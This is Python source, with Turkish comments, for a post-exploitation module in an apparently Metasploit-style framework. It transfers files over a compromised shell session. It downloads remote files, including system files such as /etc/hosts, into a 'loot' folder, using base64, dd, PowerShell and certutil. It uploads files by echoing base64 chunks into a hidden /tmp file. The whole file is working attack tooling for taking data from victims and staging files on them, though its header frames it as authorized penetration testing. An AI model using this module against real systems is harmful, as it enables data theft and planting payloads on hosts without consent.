# =============================================================================
# Post-Exploitation: Penelope Tarzı Uzak Dosya Transfer (Download/Upload)
# =============================================================================
# Aktif shell oturumu üzerinden base64 kodlama ile dosya indirme ve yükleme
# yapan modül.  Penelope'nin download/upload mantığını taklit eder.
#
# KULLANIM:
#   use post/gather/remote_download
#   set SESSION 1
#   set MODE download        (download / upload)
#   set REMOTE_PATH /etc/hosts
#   set LOCAL_PATH ./loot/hosts
#   run
#
# Bu modül tamamen etik siber güvenlik ve yetkili penetrasyon testi
# amaçlıdır. Yalnızca yazılı izin alınmış sistemlerde kullanılmalıdır.
# =============================================================================

from __future__ import annotations

import base64
import contextlib
import hashlib
import os
import time
import uuid
from typing import Any

from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    DownloadColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
    TransferSpeedColumn,
)

from core.module import BaseModule
from core.option import Option
from core.shared_state import shared_state


class RemoteDownload(BaseModule):
    """
    Penelope Tarzı Uzak Dosya Transfer Modülü.

    Shell oturumu (PTY/raw) üzerinden base64 kodlama ile dosya transferi yapar.
    """

    Name = "Remote File Transfer"
    Description = (
        "Aktif shell oturumu üzerinden base64 ile dosya indirme/yükleme yapar"
    )
    Author = "Mahmut P."
    Category = "post/gather"
    Version = "1.0"

    def __init__(self) -> None:
        super().__init__()
        self.Options = {
            "SESSION": Option("SESSION", "", True, "Hedef oturum ID'si."),
            "MODE": Option(
                "MODE", "download", True,
                "Transfer modu: download (uzaktan indir) veya upload (uzağa yükle).",
                choices=["download", "upload"],
            ),
            "REMOTE_PATH": Option(
                "REMOTE_PATH", "", True, "Uzak dosya yolu.",
            ),
            "LOCAL_PATH": Option(
                "LOCAL_PATH", "", True, "Yerel dosya yolu.",
                completion_dir=".",
            ),
            "TIMEOUT": Option(
                "TIMEOUT", 30, False, "Transfer zaman aşımı (saniye).",
            ),
            "VERIFY": Option(
                "VERIFY", "true", False,
                "Hash ile doğrulama yap (true/false).",
                choices=["true", "false"],
            ),
            "CHUNK_SIZE": Option(
                "CHUNK_SIZE", 65536, False,
                "Transfer parça boyutu (bayt). Büyük dosyalar parça parça aktarılır.",
            ),
        }
        self.console = Console()

    # ─── Progress yardımcıları ─────────────────────────────────────────────

    def _progress(self, total: int = 0) -> Progress:
        """Bayt cinsinden ilerleme çubuğu oluşturur (total=0 ise belirsiz)."""
        columns = [
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=32),
            DownloadColumn(),
        ]
        if total > 0:
            columns += [TransferSpeedColumn(), TimeRemainingColumn()]
        else:
            columns.append(TimeElapsedColumn())
        return Progress(*columns, console=self.console, transient=False)

    @staticmethod
    def _drain_socket(sock: Any, max_bytes: int = 262144) -> int:
        """
        Gönderim sırasında uzak tarafın echo/input çıktısını boşaltır.

        PTY/canonical echo açıksa uzak, gönderdiğimiz veriyi geri yazar; biz
        okumazsak receive buffer dolar ve iki taraf da bloklanır (deadlock).
        """
        drained = 0
        previous_timeout = None
        try:
            previous_timeout = sock.gettimeout()
            sock.settimeout(0)
            while drained < max_bytes:
                try:
                    chunk = sock.recv(8192)
                except (BlockingIOError, InterruptedError):
                    break
                except OSError:
                    break
                if not chunk:
                    break
                drained += len(chunk)
        except OSError:
            pass
        finally:
            with contextlib.suppress(OSError):
                sock.settimeout(previous_timeout)
        return drained

    # ─── Socket üzerinden komut çalıştırma ──────────────────────────────

    @staticmethod
    def _exec_on_session(sock: Any, command: str, timeout: float = 10.0) -> str:
        """Shell oturumuna komut gönderir ve marker tabanlı çıktı yakalar."""
        marker = f"__MAH_{uuid.uuid4().hex[:12]}__"
        start_marker = f"{marker}START"
        end_marker = f"{marker}END"

        wrapped = f"echo {start_marker} && {command} 2>/dev/null && echo {end_marker}\n"

        try:
            sock.setblocking(False)
            try:
                while True:
                    d = sock.recv(4096)
                    if not d:
                        break
            except (BlockingIOError, OSError):
                pass
            sock.setblocking(True)

            sock.sendall(wrapped.encode("utf-8", errors="replace"))

            sock.settimeout(timeout)
            response = b""
            deadline = time.time() + timeout

            while time.time() < deadline:
                try:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    response += chunk
                    if end_marker.encode() in response:
                        time.sleep(0.1)
                        try:
                            extra = sock.recv(8192)
                            if extra:
                                response += extra
                        except (TimeoutError, BlockingIOError, OSError):
                            pass
                        break
                except TimeoutError:
                    break
                except (BlockingIOError, OSError):
                    break

            sock.settimeout(None)
            decoded = response.decode("utf-8", errors="replace")

            if start_marker in decoded and end_marker in decoded:
                start_idx = decoded.index(start_marker) + len(start_marker)
                end_idx = decoded.index(end_marker)
                output = decoded[start_idx:end_idx].strip()
                lines = [ln for ln in output.split("\n")
                         if start_marker not in ln and end_marker not in ln
                         and "echo " + start_marker not in ln]
                return "\n".join(lines).strip()
            elif start_marker in decoded:
                start_idx = decoded.index(start_marker) + len(start_marker)
                return decoded[start_idx:].strip()
            return decoded.strip()
        except Exception as e:
            return f"[Hata: {e}]"

    def _detect_os(self, sock: Any, timeout: float) -> str:
        """Uzak hedefin OS'unu algılar."""
        result = self._exec_on_session(sock, "uname -s", timeout=timeout)
        if "linux" in result.lower():
            return "linux"
        if "darwin" in result.lower():
            return "macos"
        win_check = self._exec_on_session(sock, "echo %OS%", timeout=timeout)
        if "windows" in win_check.lower():
            return "windows"
        return "linux"

    # ─── Download ──────────────────────────────────────────────────────────

    def _remote_file_size(
        self, sock: Any, remote_path: str, target_os: str, timeout: float
    ) -> int:
        """Uzak dosyanın boyutunu bayt cinsinden döndürür (bilinmiyorsa 0)."""
        if target_os == "windows":
            size_str = self._exec_on_session(
                sock,
                f'powershell -NoProfile -Command "(Get-Item \'{remote_path}\').Length"',
                timeout=timeout,
            )
        else:
            size_str = self._exec_on_session(
                sock,
                f'stat -c%s "{remote_path}" 2>/dev/null || '
                f'stat -f%z "{remote_path}" 2>/dev/null || '
                f'wc -c < "{remote_path}" 2>/dev/null || echo 0',
                timeout=timeout,
            )

        # Yanıtın son satırındaki ilk sayıyı al (ekranda echo'lar olabilir)
        for line in reversed(size_str.strip().splitlines()):
            cleaned = "".join(c for c in line if c.isdigit())
            if cleaned:
                try:
                    return int(cleaned)
                except ValueError:
                    continue
        return 0

    def _read_remote_chunk(
        self, sock: Any, remote_path: str, offset: int, length: int,
        target_os: str, timeout: float,
    ) -> bytes:
        """
        Uzak dosyanın belirtilen aralığını okur ve ham bayt olarak döndürür.

        Büyük dosyaların tek seferde base64'lenmesi bellek/zaman aşımı
        sorunu yaratır; bu yüzden `dd` (Unix) / `FileStream` (Windows) ile
        parça parça okunur.
        """
        if target_os == "windows":
            # PowerShell: FileStream.Seek + Read + base64
            command = (
                "powershell -NoProfile -Command \""
                f"$s=[IO.File]::OpenRead('{remote_path}');"
                f"$s.Seek({offset},'Begin')|Out-Null;"
                f"$b=New-Object byte[] {length};"
                "$n=$s.Read($b,0," + str(length) + ");"
                "if($n -gt 0){[Console]::Out.Write("
                "[Convert]::ToBase64String($b,0,$n))};"
                "$s.Close()\""
            )
        else:
            # offset her zaman chunk_size'ın katı olduğu için skip = offset // length
            command = (
                f'dd if="{remote_path}" bs={length} skip={offset // length} '
                f'count=1 2>/dev/null | base64'
            )

        b64_output = self._exec_on_session(sock, command, timeout=timeout)
        b64_output = "".join(b64_output.split())

        if not b64_output or "[Hata" in b64_output:
            return b""

        try:
            return base64.b64decode(b64_output)
        except Exception:
            return b""

    def _verify_remote_hash(
        self, sock: Any, remote_path: str, local_data_hash: str,
        target_os: str, timeout: float,
    ) -> None:
        """Yerel hash ile uzak hash'i karşılaştırır."""
        if target_os == "windows":
            return

        remote_hash_output = self._exec_on_session(
            sock,
            f'sha256sum "{remote_path}" 2>/dev/null || '
            f'shasum -a 256 "{remote_path}" 2>/dev/null',
            timeout=timeout,
        )
        if not remote_hash_output.strip():
            return

        remote_hash = remote_hash_output.strip().split()[0]
        if local_data_hash == remote_hash:
            self.console.print("[bold green][✓] Hash doğrulaması başarılı.[/bold green]")
        else:
            self.console.print(
                f"[bold yellow][!] Hash uyuşmazlığı!\n"
                f"    Yerel : {local_data_hash}\n"
                f"    Uzak  : {remote_hash}[/bold yellow]"
            )

    def _download_file(
        self, sock: Any, remote_path: str, local_path: str,
        target_os: str, timeout: float, verify: bool, chunk_size: int = 65536,
    ) -> bool:
        """Uzak dosyayı base64 ile indirip yerel dosyaya yazar."""
        self.console.print(f"[cyan][*] İndiriliyor: {remote_path}[/cyan]")

        # Önce dosya var mı kontrol et
        if target_os == "windows":
            check = self._exec_on_session(
                sock, f'if exist "{remote_path}" (echo EXISTS) else (echo NOTFOUND)',
                timeout=timeout,
            )
        else:
            check = self._exec_on_session(
                sock, f'test -f "{remote_path}" && echo EXISTS || echo NOTFOUND',
                timeout=timeout,
            )

        if "NOTFOUND" in check:
            self.console.print(f"[bold red][!] Dosya bulunamadı: {remote_path}[/bold red]")
            return False

        # Dosya boyutunu öğren
        file_size = self._remote_file_size(sock, remote_path, target_os, timeout)
        self.console.print(f"[*] Dosya boyutu: {file_size:,} byte")

        # Yerel dizini oluştur
        local_dir = os.path.dirname(os.path.abspath(local_path))
        if local_dir:
            os.makedirs(local_dir, exist_ok=True)

        if file_size > 0 and file_size > chunk_size:
            # Büyük dosya: parça parça indir (progress bar ile)
            success = self._download_chunked(
                sock, remote_path, local_path, file_size,
                target_os, timeout, chunk_size,
            )
            if not success:
                return False
        else:
            # Küçük dosya veya boyut bilinmiyorsa: tek seferde oku
            success = self._download_whole(
                sock, remote_path, local_path, target_os, timeout,
            )
            if not success:
                return False

        actual_size = os.path.getsize(local_path)
        self.console.print(
            f"[bold green][+] İndirildi: {local_path} "
            f"({actual_size:,} byte)[/bold green]"
        )

        # Hash doğrulama
        if verify and target_os != "windows":
            with open(local_path, "rb") as f:
                local_hash = hashlib.sha256(f.read()).hexdigest()
            self._verify_remote_hash(
                sock, remote_path, local_hash, target_os, timeout
            )

        return True

    def _download_chunked(
        self, sock: Any, remote_path: str, local_path: str, file_size: int,
        target_os: str, timeout: float, chunk_size: int,
    ) -> bool:
        """Büyük dosyaları parça parça indirir; ilerleme çubuğu gösterir."""
        chunk_count = (file_size + chunk_size - 1) // chunk_size
        downloaded = 0

        with open(local_path, "wb") as f, self._progress(file_size) as progress:
            task = progress.add_task(
                f"İndiriliyor: {remote_path}", total=file_size
            )
            for _ in range(chunk_count):
                chunk = self._read_remote_chunk(
                    sock, remote_path, downloaded, chunk_size,
                    target_os, timeout,
                )
                if not chunk:
                    break
                f.write(chunk)
                downloaded += len(chunk)
                progress.update(task, completed=downloaded)

        if downloaded < file_size:
            self.console.print(
                f"[bold yellow][!] Transfer yarıda kesildi: "
                f"{downloaded:,} / {file_size:,} byte alındı.[/bold yellow]"
            )
            return False

        return True

    def _download_whole(
        self, sock: Any, remote_path: str, local_path: str,
        target_os: str, timeout: float,
    ) -> bool:
        """Küçük dosyaları tek komutta base64 olarak indirir."""
        if target_os == "windows":
            b64_cmd = f'certutil -encode "{remote_path}" CON'
        else:
            # NOT: macOS/BSD base64 pozisyonel dosya argümanı desteklemez
            # ("invalid argument"); yönlendirme ile okumak her ikisinde de çalışır.
            b64_cmd = f'base64 < "{remote_path}"'

        with self._progress(0) as progress:
            task = progress.add_task(f"Okunuyor: {remote_path}", total=None)
            b64_output = self._exec_on_session(sock, b64_cmd, timeout=timeout)
            progress.update(task, completed=1)

        if not b64_output or "[Hata" in b64_output:
            self.console.print("[bold red][!] base64 okuması başarısız.[/bold red]")
            return False

        # Windows certutil çıktısını temizle
        if target_os == "windows":
            lines = b64_output.split("\n")
            cleaned = [ln for ln in lines
                       if "BEGIN CERTIFICATE" not in ln
                       and "END CERTIFICATE" not in ln
                       and "CertUtil" not in ln]
            b64_output = "".join(ln.strip() for ln in cleaned)
        else:
            b64_output = "".join(b64_output.split())

        try:
            file_data = base64.b64decode(b64_output)
        except Exception as e:
            self.console.print(f"[bold red][!] Base64 decode hatası: {e}[/bold red]")
            return False

        with open(local_path, "wb") as f:
            f.write(file_data)

        return True


    # ─── Upload ────────────────────────────────────────────────────────────

    def _upload_file(
        self, sock: Any, local_path: str, remote_path: str,
        target_os: str, timeout: float, verify: bool,
    ) -> bool:
        """Yerel dosyayı base64 ile uzak sisteme yükler."""
        if not os.path.isfile(local_path):
            self.console.print(f"[bold red][!] Yerel dosya bulunamadı: {local_path}[/bold red]")
            return False

        with open(local_path, "rb") as f:
            file_data = f.read()

        file_size = len(file_data)
        self.console.print(f"[cyan][*] Yükleniyor: {local_path} → {remote_path}[/cyan]")
        self.console.print(f"[*] Dosya boyutu: {file_size:,} byte")

        b64_data = base64.b64encode(file_data).decode("ascii")

        # Chunk'lara böl. PTY oturumlarında terminal satır sınırı ~4096 bayt
        # olduğu için komut satırı bu sınırın altında kalmalı.
        chunk_size = 2048
        chunks = [
            b64_data[i:i + chunk_size] for i in range(0, len(b64_data), chunk_size)
        ]

        if file_size == 0:
            self.console.print("[bold yellow][*] Dosya boş, boş dosya oluşturulacak.[/bold yellow]")
            if target_os == "windows":
                self._exec_on_session(
                    sock, f'type nul > "{remote_path}"', timeout=timeout
                )
            else:
                self._exec_on_session(
                    sock, f': > "{remote_path}"', timeout=timeout
                )
            self.console.print(
                f"[bold green][+] Yüklendi: {remote_path} (0 byte)[/bold green]"
            )
            return True

        self.console.print(f"[*] {len(chunks)} parça olarak gönderiliyor...")

        # Windows: certutil yöntemi (tmp dosya yanına)
        tmp_b64 = (
            remote_path + ".b64" if target_os == "windows" else "/tmp/.mah_upload.b64"
        )
        prefix = "" if target_os == "windows" else "-n "

        sent = 0
        with self._progress(file_size) as progress:
            task = progress.add_task(
                f"Yükleniyor: {remote_path}", total=file_size
            )
            for i, chunk in enumerate(chunks):
                redirect = ">" if i == 0 else ">>"
                line = f"echo {prefix}'{chunk}' {redirect} \"{tmp_b64}\"\n"
                try:
                    sock.sendall(line.encode("utf-8", errors="replace"))
                except (OSError, BrokenPipeError) as e:
                    self.console.print(f"[bold red][!] Gönderme hatası: {e}[/bold red]")
                    return False

                sent += len(chunk) * 3 // 4
                progress.update(task, completed=min(sent, file_size))

                # Uzak tarafın echo/input çıktısını boşalt (deadlock koruması)
                self._drain_socket(sock)

        # Gönderilen verinin tamamı tüketildikten sonra decode et
        if target_os == "windows":
            result = self._exec_on_session(
                sock, f'certutil -decode "{tmp_b64}" "{remote_path}" && del "{tmp_b64}"',
                timeout=timeout,
            )
        else:
            # GNU base64 '-d', BSD/macOS '-D' kullanır. macOS ayrıca dosyayı
            # konumsal argüman olarak kabul etmez; yönlendirme şart.
            result = self._exec_on_session(
                sock,
                f'base64 -d < "{tmp_b64}" > "{remote_path}" 2>/dev/null || '
                f'base64 -D < "{tmp_b64}" > "{remote_path}" 2>/dev/null; '
                f'rm -f "{tmp_b64}"',
                timeout=timeout,
            )

        if "[Hata" in result:
            self.console.print(f"[bold red][!] Decode hatası: {result}[/bold red]")
            return False

        # Boyut kontrolü: decode sessizce başarısız olup boş dosya bırakabilir
        remote_size = self._remote_file_size(
            sock, remote_path, target_os, timeout
        )
        if remote_size != file_size:
            self.console.print(
                f"[bold red][!] Boyut uyuşmazlığı: yerel {file_size:,} byte, "
                f"uzak {remote_size:,} byte.[/bold red]"
            )
            return False

        self.console.print(
            f"[bold green][+] Yüklendi: {remote_path} ({file_size:,} byte)[/bold green]"
        )

        # Hash doğrulama
        if verify and target_os != "windows":
            local_hash = hashlib.sha256(file_data).hexdigest()
            remote_hash_output = self._exec_on_session(
                sock,
                f'sha256sum "{remote_path}" 2>/dev/null || '
                f'shasum -a 256 "{remote_path}" 2>/dev/null',
                timeout=timeout,
            )
            if remote_hash_output:
                remote_hash = remote_hash_output.strip().split()[0] if remote_hash_output.strip() else ""
                if local_hash == remote_hash:
                    self.console.print("[bold green][✓] Hash doğrulaması başarılı.[/bold green]")
                else:
                    self.console.print(
                        "[bold yellow][!] Hash uyuşmazlığı![/bold yellow]"
                    )

        return True

    # ─── Ana Çalıştırma ────────────────────────────────────────────────────

    def run(self, options: dict[str, Any]) -> bool:
        """Shell oturumu üzerinden dosya transfer yapar."""
        session_id_raw = options.get("SESSION", "")
        if not session_id_raw or str(session_id_raw).strip() == "":
            self.console.print("[bold red][!] SESSION belirtilmedi.[/bold red]")
            return False

        try:
            session_id = int(str(session_id_raw).strip())
        except ValueError:
            self.console.print(f"[bold red][!] Geçersiz SESSION: {session_id_raw}[/bold red]")
            return False

        mode = str(options.get("MODE", "download")).lower().strip()
        remote_path = str(options.get("REMOTE_PATH", "")).strip()
        local_path = str(options.get("LOCAL_PATH", "")).strip()
        timeout = float(options.get("TIMEOUT", 30))
        verify = str(options.get("VERIFY", "true")).lower() == "true"

        if not remote_path:
            self.console.print("[bold red][!] REMOTE_PATH belirtilmedi.[/bold red]")
            return False
        if not local_path:
            self.console.print("[bold red][!] LOCAL_PATH belirtilmedi.[/bold red]")
            return False

        # Oturumu bul
        if not shared_state.session_manager:
            self.console.print("[bold red][!] Session manager başlatılmamış.[/bold red]")
            return False

        session = shared_state.session_manager.get_session(session_id)
        if not session:
            self.console.print(f"[bold red][!] Session {session_id} bulunamadı.[/bold red]")
            return False

        handler = session.get("handler")
        if not handler:
            self.console.print(f"[bold red][!] Session {session_id}: handler yok.[/bold red]")
            return False

        sock = None
        if hasattr(handler, "resolve_client_sock"):
            sock = handler.resolve_client_sock(session_id)
        if not sock:
            sock = getattr(handler, "client_sock", None)
        if not sock:
            self.console.print(f"[bold red][!] Session {session_id}: aktif soket yok.[/bold red]")
            return False

        # OS algıla
        target_os = self._detect_os(sock, min(timeout, 10))

        self.console.print()
        mode_icon = "⬇️" if mode == "download" else "⬆️"
        self.console.print(Panel.fit(
            f"[bold cyan]{mode_icon} DOSYA TRANSFERİ — Session {session_id}[/bold cyan]\n"
            f"[dim]Mod: {mode} | OS: {target_os}[/dim]",
            border_style="cyan",
        ))

        try:
            chunk_size = max(1024, int(options.get("CHUNK_SIZE", 65536)))
        except (TypeError, ValueError):
            chunk_size = 65536

        if mode == "download":
            success = self._download_file(
                sock, remote_path, local_path, target_os, timeout, verify,
                chunk_size=chunk_size,
            )
        elif mode == "upload":
            success = self._upload_file(
                sock, local_path, remote_path, target_os, timeout, verify
            )
        else:
            self.console.print(f"[bold red][!] Geçersiz mod: {mode}[/bold red]")
            return False

        if shared_state.session_manager:
            shared_state.session_manager.update_session_activity(session_id)

        return success
